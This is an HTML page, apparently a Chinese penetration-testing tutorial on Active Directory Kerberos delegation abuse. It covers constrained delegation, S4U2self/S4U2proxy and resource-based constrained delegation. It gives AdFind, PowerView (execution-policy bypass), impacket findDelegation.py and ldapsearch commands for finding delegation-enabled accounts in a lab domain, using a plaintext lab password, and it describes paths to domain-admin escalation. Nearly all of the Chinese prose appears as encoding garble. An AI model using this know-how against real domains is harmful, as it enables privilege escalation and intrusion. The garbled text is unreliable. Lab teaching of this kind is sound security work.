&lt;p&gt;ä¸Šå›¾æè¿°äº†ä»¥ä¸‹åè®®æ­¥éª¤ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ç”¨æˆ·çš„æœºå™¨å‘æœåŠ¡ 1 å‘å‡ºè¯·æ±‚ã€‚ç”¨æˆ·é€šè¿‡äº†èº«ä»½éªŒè¯ï¼Œä½†æœåŠ¡ 1 æ²¡æœ‰ç”¨æˆ·çš„æˆæƒæ•°æ®ã€‚è¿™é€šå¸¸æ˜¯ç”±äºèº«ä»½éªŒè¯æ˜¯é€šè¿‡ Kerberos ä»¥å¤–çš„å…¶ä»–æ–¹å¼æ‰§è¡Œçš„ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœåŠ¡ 1 å·²é€šè¿‡ KDC è¿›è¡Œèº«ä»½éªŒè¯å¹¶è·å¾—å…¶ TGTï¼Œé€šè¿‡ S4U2self æ‰©å±•ä»£è¡¨æŒ‡å®šç”¨æˆ·å‘è‡ªå·±è¯·æ±‚æœåŠ¡ç¥¨è¯ã€‚ ç”¨æˆ·ç”±S4U2self æ•°æ®ä¸­çš„ç”¨æˆ·åå’Œç”¨æˆ·é¢†åŸŸåç§°æ ‡è¯†ã€‚æˆ–è€…ï¼Œå¦‚æœæœåŠ¡ 1 æ‹¥æœ‰ç”¨æˆ·çš„è¯ä¹¦ï¼Œå®ƒå¯ä»¥ä½¿ç”¨è¯ä¹¦å‘ KDC ä½¿ç”¨&lt;a href=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/cd9d5ca7-ce20-4693-872b-2f5dd41cbff6&#34;&gt;PA-S4U-X509-USER&lt;/a&gt; ç»“æ„è¯†åˆ«ç”¨æˆ·ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;KDC ä¼šè¿”å›ä¸€ä¸ªå‘å¾€æœåŠ¡ 1 çš„æœåŠ¡ç¥¨è¯ï¼Œå°±å¥½åƒå®ƒæ˜¯ä½¿ç”¨ç”¨æˆ·è‡ªå·±çš„ TGT å‘ç”¨æˆ·è¯·æ±‚çš„ä¸€æ ·ã€‚æœåŠ¡ç¥¨è¯å¯èƒ½åŒ…å«ç”¨æˆ·çš„æˆæƒæ•°æ®ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœåŠ¡ 1 å¯ä»¥ä½¿ç”¨æœåŠ¡ç¥¨è¯ä¸­çš„æˆæƒæ•°æ®æ¥æ»¡è¶³ç”¨æˆ·çš„è¯·æ±‚ã€‚ç„¶åæœåŠ¡å“åº”ç”¨æˆ·ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;å°½ç®¡ S4U2self å‘æœåŠ¡ 1 æä¾›æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ï¼Œä½†æ­¤æ‰©å±•ä¸å…è®¸æœåŠ¡ 1 ä»£è¡¨ç”¨æˆ·æå‡ºå…¶ä»–æœåŠ¡çš„è¯·æ±‚ã€‚è¿™å°±æ˜¯S4U2proxyçš„ä½œç”¨ã€‚è¿™é‡Œå°±æ˜¯ä¸ºä»€ä¹ˆå—é™çš„åŸå› äº†&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç”¨æˆ·çš„æœºå™¨å‘æœåŠ¡ 1 å‘å‡ºè¯·æ±‚ã€‚æœåŠ¡ 1 éœ€è¦ä»¥ç”¨æˆ·èº«ä»½è®¿é—®æœåŠ¡ 2 ä¸Šçš„èµ„æºã€‚ä½†æ˜¯ï¼ŒæœåŠ¡ 1 æ²¡æœ‰æ¥è‡ªç”¨æˆ·çš„è½¬å‘ TGT æ¥é€šè¿‡è½¬å‘ TGT æ‰§è¡Œå§”æ´¾ï¼Œå¦‚å›¾ä¸­æŒ‡å®šä½¿ç”¨è½¬å‘ TGT çš„ Kerberos å§”æ´¾ä¸­æ‰€è¿°ã€‚ä¸¤ä¸ªå‰ææ¡ä»¶é€‚ç”¨äºæ­¤æ­¥éª¤ã€‚é¦–å…ˆï¼ŒæœåŠ¡ 1 å·²ç»é€šè¿‡ KDC è¿›è¡Œäº†èº«ä»½éªŒè¯ï¼Œå¹¶ä¸”å…·æœ‰æœ‰æ•ˆçš„ TGTã€‚å…¶æ¬¡ï¼ŒæœåŠ¡ 1 æœ‰ä¸€ä¸ªä»ç”¨æˆ·åˆ°æœåŠ¡ 1 çš„å¯è½¬å‘æœåŠ¡ç¥¨è¯ã€‚è¿™ä¸ªå¯è½¬å‘æœåŠ¡ç¥¨è¯å¯èƒ½æ˜¯é€šè¿‡ [RFC4120] ç¬¬ 3.2 èŠ‚ä¸­æŒ‡å®šçš„&lt;strong&gt;KRB_AP_REQ&lt;/strong&gt; æ¶ˆæ¯æˆ–é€šè¿‡ S4U2self è¯·æ±‚è·å¾—çš„ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœåŠ¡ 1 ä»£è¡¨æŒ‡å®šç”¨æˆ·å‘æœåŠ¡ 2 è¯·æ±‚æœåŠ¡ç¥¨è¯ã€‚ç”¨æˆ·ç”±æœåŠ¡ 1 çš„æœåŠ¡ç¥¨è¯ä¸­çš„å®¢æˆ·ç«¯åç§°å’Œå®¢æˆ·é¢†åŸŸæ ‡è¯†ã€‚è¦è¿”å›çš„ç¥¨è¯ä¸­çš„æˆæƒæ•°æ®ä¹Ÿä»æœåŠ¡ç¥¨è¯ä¸­å¤åˆ¶ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¦‚æœè¯·æ±‚ä¸­åŒ…å«&lt;a href=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_26456104-0afb-4afe-a92e-ac160a9efdf8&#34;&gt;ç‰¹æƒå±æ€§è¯ä¹¦ (PAC)&lt;/a&gt;ï¼Œåˆ™ KDC é€šè¿‡æ£€æŸ¥ PAC ç»“æ„çš„ç­¾åæ•°æ®æ¥éªŒè¯ PACï¼Œå¦‚[&lt;a href=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962&#34;&gt;MS-PAC]&lt;/a&gt; ç¬¬ 2.8 èŠ‚ä¸­æ‰€è¿°ã€‚å¦‚æœ PAC æœ‰æ•ˆæˆ–ä¸å­˜åœ¨ï¼ŒKDC ä¼šè¿”å›æœåŠ¡ 2 çš„æœåŠ¡ç¥¨è¯ï¼Œä½†å­˜å‚¨åœ¨æœåŠ¡ç¥¨è¯çš„&lt;strong&gt;cname&lt;/strong&gt;å’Œ&lt;strong&gt;crealm&lt;/strong&gt; å­—æ®µä¸­çš„å®¢æˆ·ç«¯èº«ä»½æ˜¯ç”¨æˆ·çš„èº«ä»½ï¼Œè€Œä¸æ˜¯æœåŠ¡ 1 çš„èº«ä»½ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœåŠ¡ 1 ä½¿ç”¨æœåŠ¡ç¥¨è¯å‘æœåŠ¡ 2 å‘å‡ºè¯·æ±‚ã€‚æœåŠ¡ 2 å°†æ­¤è¯·æ±‚è§†ä¸ºæ¥è‡ªç”¨æˆ·ï¼Œå¹¶å‡å®šç”¨æˆ·å·²é€šè¿‡ KDC èº«ä»½éªŒè¯ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœåŠ¡ 2 å“åº”è¯·æ±‚ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœåŠ¡ 1 å“åº”ç”¨æˆ·å¯¹æ¶ˆæ¯ 5 çš„è¯·æ±‚ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ç®€è€Œè¨€ä¹‹ä¸€å¥è¯ï¼š å¦‚æœ service1 æœ‰äº† protocol transition æƒé™çš„è¯ï¼Œservice1 å¯ä»¥&lt;strong&gt;ä»¥ä»»ä½•ä¸€ä¸ªåŸŸå†…ç”¨æˆ·çš„èº«ä»½&lt;/strong&gt;å‘ KDC ç”³è¯·ä¸€å¼ è®¿é—® service1 è‡ªèº«çš„ç¥¨æ®ï¼Œ&lt;strong&gt;è€Œä¸”ä¸éœ€è¦çŸ¥é“ç›®æ ‡ç”¨æˆ·çš„å¯†ç &lt;/strong&gt;ã€‚æ¯”å¦‚ service1 å¯ä»¥ä»¥åŸŸç®¡ç†å‘˜ Administrator çš„èº«ä»½å‘ KDC ç”³è¯·ä¸€å¼ è®¿é—® service1è‡ªèº«çš„ç¥¨æ®ã€‚ï¼ˆå¦‚æœä½ èƒ½æ‰¾åˆ°è¿™ä¹ˆä¸€ä¸ªæœåŠ¡ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è¿™ä¸ªæœåŠ¡æ‰§è¡Œä»£ç çš„è¯ï¼Œä½ æ˜¯æœ‰å¯èƒ½ç›´æ¥åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½ææƒè‡³åŸŸç®¡ç†å‘˜çš„ï¼Œå½“ç„¶è¿™ä¸ªæ—¶å€™ä½ è·å–åˆ°çš„åŸŸç®¡æƒé™æ˜¯è¢«é™åˆ¶åœ¨è¿™å°æœºå™¨ä¸Šçš„ï¼Œæ— æ³•è®¿é—®åˆ«çš„æœåŠ¡å™¨ã€‚ï¼‰&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥å¤§å®¶ä¹Ÿå¯ä»¥æƒ³æƒ³çº¦æŸå§”æ´¾å’Œéçº¦æŸå§”æ´¾çš„åŒºåˆ«ï¼Œé¦–å…ˆéçº¦æŸå§”æ´¾è¦åŸŸç®¡ç†å‘˜è®¿é—®æ‰èƒ½è·å–åˆ°TGTï¼Œè€Œçº¦æŸå§”æ´¾åˆ™æ˜¯èƒ½è°ƒç”¨S4U2è¿™ä¸ªåè®®è·å–åˆ°ä»»ä½•åŸŸå†…ç”¨æˆ·çš„TGTï¼Œçº¦æŸçš„ç‚¹ä¹Ÿåœ¨è¿™ä¸ªåè®®ä¸Šï¼Œæ‰€ä»¥å®ƒæ‹¿åˆ°çš„TGSä¹Ÿå°±æ˜¯STç¥¨æ®ä¹Ÿæœ‰å±€é™æ€§ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡å‘½ä»¤è¡Œæ‰“å¼€adsiedit.mscæŸ¥çœ‹testsqlç”¨æˆ·å±æ€§ï¼Œå¯ä»¥çœ‹åˆ°ï¼š&lt;/p&gt;
&lt;p&gt;å½“è¢«è®¾ç½®ä¸ºçº¦æŸå§”æ´¾çš„æ—¶å€™ï¼Œå®ƒçš„userAccountControlä¼šåŒ…å«TRUSTED_TO_AUTHENTICATE_FOR_DELEGATIONå­—æ®µã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/37.png&#34; alt=&#34;37&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¹¶ä¸”æ¯”éçº¦æŸå§”æ´¾çš„è´¦æˆ·å¤šäº†msDS-AllowedToDelegateToå­—æ®µï¼Œé‡Œé¢åŒ…å«äº†å…è®¸å§”æ´¾çš„æœåŠ¡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/38.png&#34; alt=&#34;38&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;å‘ç°çº¦æŸå§”æ´¾ä¿¡æ¯&#34;&gt;å‘ç°çº¦æŸå§”æ´¾ä¿¡æ¯&lt;/h2&gt;
&lt;h3 id=&#34;adfind-1&#34;&gt;AdFind&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;http://www.joeware.net/freetools/tools/adfind/index.htm&#34;&gt;AdFind&lt;/a&gt;å·¥å…·ä½¿ç”¨LDAPåè®®æŸ¥è¯¢åŸŸå†…çš„å„ç§ä¿¡æ¯ï¼Œä¸‹é¢æ˜¯æŸ¥è¯¢çº¦æŸå§”æ´¾æœåŠ¡è´¦å·ä»¥åŠå¯¹åº”çš„å§”æ´¾å¯¹è±¡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;AdFind&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-b&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;DC=hack,DC=lab&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;(&amp;amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cn&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;distinguishedName&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;msds-allowedtodelegateto&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/39.png&#34; alt=&#34;39&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“ç„¶ä¹Ÿå¯ä»¥æŸ¥è¯¢çº¦æŸå§”æ´¾ä¸»æœºè´¦å·ä»¥åŠå¯¹åº”çš„å§”æ´¾å¯¹è±¡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AdFind.exe -b &amp;#34;DC=hack,DC=lab&amp;#34; -f &amp;#34;(&amp;amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&amp;#34; cn distinguishedName msds-allowedtodelegateto
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;powerview-1&#34;&gt;PowerView&lt;/h3&gt;
&lt;p&gt;æŸ¥è¯¢çº¦æŸå§”æ´¾çš„æœåŠ¡è´¦å·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exec&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bypass&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp; {Import-Module .\powerview.ps1;Get-DomainUser -TrustedToAuth -Domain hack.lab | select name }&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/40.png&#34; alt=&#34;40&#34;&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥è¯¢çº¦æŸå§”æ´¾çš„ä¸»æœºè´¦å·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-exec&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bypass&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp; {Import-Module .\powerview.ps1;Get-DomainComputer -TrustedToAuth -Domain hack.lab | select name}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;inddelegationpy&#34;&gt;indDelegation.py&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/SecureAuthCorp/impacket/blob/master/examples/findDelegation.py&#34;&gt;findDelegation.py&lt;/a&gt;æ˜¯é›†æˆåœ¨impacketå·¥å…·åŒ…ä¸­çš„ä¸€æ¬¾å·¥å…·ï¼Œå…·ä½“ç”¨æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;findDelegation.py -dc-ip 172.16.0.106 -target-domain hack.lab hack.lab/lucky:p@ssw0rd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/41.png&#34; alt=&#34;41&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ldapsearch-1&#34;&gt;ldapsearch&lt;/h3&gt;
&lt;p&gt;è¿™æ¬¾æ˜¯kaliè‡ªå¸¦ï¼Œå¯ä»¥åœ¨åŸŸå¤–ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æŸ¥æ‰¾åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„æœåŠ¡è´¦å·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ldapsearch -LLL -x -H ldap://172.16.0.106:389 -D &lt;span class=&#34;s2&#34;&gt;&amp;#34;lucky@hack.lab&amp;#34;&lt;/span&gt; -w &lt;span class=&#34;s2&#34;&gt;&amp;#34;p@ssw0rd&amp;#34;&lt;/span&gt; -b &lt;span class=&#34;nv&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;hack,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lab  &lt;span class=&#34;s2&#34;&gt;&amp;#34;(&amp;amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&amp;#34;&lt;/span&gt; cn distinguishedName msds-allowedtodelegateto
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/42.png&#34; alt=&#34;42&#34;&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥æ‰¾åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„ä¸»æœºè´¦å·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ldapsearch -LLL -x -H ldap://172.16.0.106:389 -D &lt;span class=&#34;s2&#34;&gt;&amp;#34;lucky@hack.lab&amp;#34;&lt;/span&gt; -w &lt;span class=&#34;s2&#34;&gt;&amp;#34;p@ssw0rd&amp;#34;&lt;/span&gt; -b &lt;span class=&#34;nv&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;hack,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lab  &lt;span class=&#34;s2&#34;&gt;&amp;#34;(&amp;amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&amp;#34;&lt;/span&gt; cn distinguishedName msds-allowedtodelegateto
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x03-åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾rbcd&#34;&gt;0x03 åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ï¼ˆRBCDï¼‰&lt;/h1&gt;
&lt;h2 id=&#34;åŸç†-2&#34;&gt;åŸç†&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªè¿˜æ˜¯å¾—ä»åŸç†å¼€å§‹ä»‹ç»ï¼Œä¸‹é¢å¤§å®¶è·Ÿç€äº†è§£ä¸€ä¸‹å†å®æˆ˜ã€‚&lt;/p&gt;
&lt;p&gt;ä¼ ç»Ÿçš„å§”æ´¾ï¼Œåœ¨è®¾ç½®çš„è¿‡ç¨‹ä¸­å…¶å®éƒ½æ˜¯éœ€è¦SeEnableDelegationç‰¹æƒï¼Œè€Œè¿™ä¸ªç‰¹æƒéœ€è¦åŸŸç®¡ç†å‘˜æ‰èƒ½è®¾ç½®ã€‚ç›¸å¯¹äºä¼ ç»Ÿçš„å§”æ´¾ï¼ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾å®ƒä¸éœ€è¦åŸŸç®¡ç†å‘˜è®¾ç½®ï¼Œè€Œæ˜¯æœºå™¨æœ¬èº«ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;çº¦æŸå§”æ´¾å’ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾çš„åŒºåˆ«ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å‰è€…ï¼š&lt;code&gt;é€šè¿‡æœåŠ¡Aå§”æ´¾åˆ°æœåŠ¡B&lt;/code&gt;ï¼Œå®é™…æ˜¯åœ¨æœåŠ¡Aä¸Šå¢åŠ TRUSTED_FOR_DELEGATIONå­—æ®µï¼ˆ&lt;code&gt;éçº¦æŸå§”æ´¾&lt;/code&gt;ï¼‰ï¼ŒTRUSTED_TO_AUTHENTICATE_FOR_DELEGATIONå’ŒmsDS-AllowedToDelegateTo ï¼ˆ&lt;code&gt;çº¦æŸå§”æ´¾&lt;/code&gt;ï¼‰å­—æ®µæ¥è¾¾åˆ°å§”æ´¾çš„ç›®çš„ã€‚&lt;/p&gt;
&lt;p&gt;åè€…ï¼š&lt;code&gt;é€šè¿‡æœåŠ¡Bå…è®¸æœåŠ¡Aå§”æ´¾åˆ°æœåŠ¡B&lt;/code&gt;ï¼Œå®é™…æ˜¯é€šè¿‡æœåŠ¡Bè‡ªèº«èµ‹äºˆmsDS-AllowedToActOnBehalfOfOtherIdentityå­—æ®µï¼Œä»è€Œå…è®¸æœåŠ¡Aå¯¹æœåŠ¡Bçš„åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥å½“åˆ©ç”¨åˆ°åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾çš„æ—¶å€™ï¼Œ&lt;code&gt;æœåŠ¡Açš„ä¸¤ä¸ªå­—æ®µæ˜¯æ²¡æœ‰èµ‹å€¼çš„&lt;/code&gt;ï¼Œå½“è¿™ä¸¤ä¸ªå­—æ®µæ²¡æœ‰è¢«èµ‹å€¼çš„æ—¶å€™ï¼Œé€šè¿‡S4U2Selfå¾—åˆ°çš„STæœåŠ¡ç¥¨è¯æ˜¯&lt;code&gt;ä¸å¯è¢«è½¬å‘&lt;/code&gt;çš„ï¼Œè€ŒS4U2Proxyçš„ä½œç”¨å°±æ˜¯&lt;code&gt;å°†å¯è½¬å‘çš„STç¥¨æ®è½¬å‘åˆ°å…¶ä»–æœåŠ¡&lt;/code&gt;è¿›è¡Œå§”æ´¾è®¤è¯ã€‚ä½†æ˜¯ï¼šåœ¨åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾è¿‡ç¨‹ä¸­ï¼Œä¸å¯è½¬å‘çš„STä»å¯ä»¥é€šè¿‡S4U2Proxyè½¬å‘åˆ°å…¶ä»–æœåŠ¡è¿›è¡Œå§”æ´¾è®¤è¯ï¼Œå¹¶ä¸”æœ€åè¿˜ä¼šè¿”å›ä¸€å¼ å¯è½¬å‘çš„STæœåŠ¡ç¥¨è¯ã€‚&lt;/p&gt;
&lt;p&gt;å› æ­¤ï¼Œå¦‚æœèƒ½å¤Ÿåœ¨æœåŠ¡Bä¸Šé…ç½®å…è®¸æœåŠ¡Açš„åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡æ§åˆ¶æœåŠ¡Aä½¿ç”¨S4U2Selfå‘åŸŸæ§è¯·æ±‚ä»»æ„ç”¨æˆ·è®¿é—®è‡ªèº«çš„æœåŠ¡ç¥¨æ®ï¼Œæœ€åå†ä½¿ç”¨S4U2Proxyè½¬å‘æ­¤ST1ç¥¨æ®å»è¯·æ±‚è®¿é—®æœåŠ¡Bçš„å¯è½¬å‘çš„ST2æœåŠ¡ç¥¨æ®ï¼Œå°±å¯ä»¥æ¨¡æ‹Ÿä»»æ„ç”¨æˆ·è®¿é—®æœåŠ¡Bäº†ã€‚è¿™é‡Œå¯ä»¥ä»¥æ™®é€šåŸŸç”¨æˆ·çš„èº«ä»½å»åˆ›å»ºæœºå™¨è´¦å·ä½œä¸ºæœåŠ¡Aã€‚&lt;/p&gt;
&lt;p&gt;ç®€å•çš„è®²ï¼Œä¹Ÿå°±æ˜¯å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿåœ¨Service Bçš„æœºå™¨ä¸Šè®¾ç½®&lt;code&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt;å±æ€§ä¸ºService Aï¼Œä¹Ÿå°±å…è®¸Service Aåˆ©ç”¨s4u2selfåè®®ä»£è¡¨å…¶ä»–ç”¨æˆ·èº«ä»½æ¥è®¿é—®Service Bçš„è¯ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åšåˆ°ææƒç­‰æ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/43.png&#34; alt=&#34;43&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£æ€ä¹ˆæ‰æœ‰è®¾ç½®&lt;code&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt;å±æ€§çš„æƒé™å‘¢ï¼Œä¹Ÿå°±æ˜¯æœ‰&lt;strong&gt;WriteProperty&lt;/strong&gt;çš„æƒé™ã€‚&lt;/p&gt;
&lt;p&gt;ä¸¾ä¸ªä¾‹å­ï¼šå°æ˜åˆšæ¥åˆ°å…¬å¸å…¥èŒï¼Œå…¬å¸å‘äº†ä¸€ä¸ªè´¦å·luckyå’Œå¯†ç ä¸ºp@sswordè®©ä»–è®¾ç½®ä¸€ä¸‹æ–°ç”µè„‘ã€‚ä»–éœ€è¦æŠŠæ–°ç”µè„‘åŠ å…¥åŸŸhack.labï¼Œäºæ˜¯ä»–å¼€å§‹æ“ä½œï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/45.png&#34; alt=&#34;45&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;win7a&lt;/code&gt; ï¼ˆæœºå™¨åï¼‰è¿™å°æœºå™¨åœ¨åŠ åŸŸçš„æ—¶å€™å¡«å†™çš„åŸŸå†…è´¦æˆ·æ˜¯ &lt;code&gt;lucky&lt;/code&gt;ï¼Œé‚£ä¹ˆ &lt;code&gt;lucky&lt;/code&gt; è¿™ä¸ªåŸŸç”¨æˆ·å°±æœ‰ä¿®æ”¹ &lt;code&gt;win7a&lt;/code&gt; ï¼ˆæœºå™¨åï¼‰è¿™å°ä¸»æœºçš„&lt;code&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt; å±æ€§çš„æƒé™ã€‚&lt;/p&gt;
